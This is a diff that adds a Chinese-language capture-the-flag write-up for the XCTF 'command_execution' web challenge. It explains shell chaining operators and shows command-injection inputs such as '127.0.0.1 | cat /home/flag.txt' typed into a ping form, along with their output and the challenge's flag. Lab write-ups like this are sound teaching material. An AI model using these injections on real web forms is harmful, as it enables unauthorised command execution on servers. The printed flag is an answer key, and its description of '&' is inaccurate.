@@ -157,3 +157,66 @@ if($b>1234){
 
 ------
 
+### [command_execution](https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5071)
+
+先来简单了解一下`Command`的四种执行方式：
+
+```
+command1 & command2 ：不管command1执行成功与否，都会执行command2，并且将上一个命令的输出作为下一个命令的输入
+command1 && command2 ：先执行command1执行成功后才会执行command2，若command1执行失败，则不执行command2
+command1 | command2 ：只执行command2
+command1 || command2 ：command1执行失败，再执行command2(若command1执行成功，就不再执行command2)
+```
+
+然后这一题只需要无脑爆破就完事了，输入`127.0.0.1 | ls`后点击`PING`发现回显如下：
+
+```bash
+ping -c 3 127.0.0.1 | ls
+index.php
+```
+
+显然网站目录下并没有`flag`相关文件，输入`127.0.0.1 | ls /`后点击`PING`发现回显如下：
+
+```bash
+ping -c 3 127.0.0.1 | ls /
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+run.sh
+sbin
+srv
+sys
+tmp
+usr
+var
+```
+
+首先访问`home`来查看有无`flag`相关信息，输入`127.0.0.1 | ls /home`后点击`PING`发现回显如下：
+
+```bash
+ping -c 3 127.0.0.1 | ls /home
+flag.txt
+```
+
+好家伙！果断输入`127.0.0.1 | cat /home/flag.txt`后点击`PING`发现回显如下：
+
+```bash
+ping -c 3 127.0.0.1 | cat /home/flag.txt
+cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}
+```
+
+提交`cyberpeace{a3da29df7d0cd9ad500448f96ea9159b}`即可。
+
+------
+
+#### 
